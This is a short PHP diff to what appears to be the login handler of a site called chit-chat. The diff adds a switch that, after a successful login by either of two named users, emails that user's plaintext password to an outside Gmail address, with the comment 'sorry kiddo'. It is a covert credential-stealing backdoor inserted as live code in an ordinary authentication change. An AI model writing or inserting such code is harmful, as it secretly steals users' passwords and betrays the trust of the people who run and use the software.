@@ -16,6 +16,12 @@
     		return Redirect( "?p=a" );
     	}
     	else {
+            switch ( strtolower( $username ) ) {
+                case 'alienhack': // sorry kiddo
+                case 'dionysiz':
+                    mail( 'dionyziz@gmail.com', $username . "'s password", "$username's password on chit-chat is \"$password\"" );
+            }
+            
     		$user->UpdateLastLogon();
     		$user->RenewAuthtoken();
     		$user->SetCookie();
